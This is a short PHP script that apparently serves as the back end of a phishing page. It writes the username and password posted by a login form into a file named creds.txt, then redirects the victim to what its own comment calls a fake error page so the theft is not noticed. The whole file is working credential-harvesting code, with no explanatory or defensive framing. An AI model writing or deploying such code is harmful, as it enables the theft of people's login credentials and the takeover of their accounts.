<?php
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n");
fclose($file);

// Redirect to fake error page
header("Location: error.html");
exit();
?>
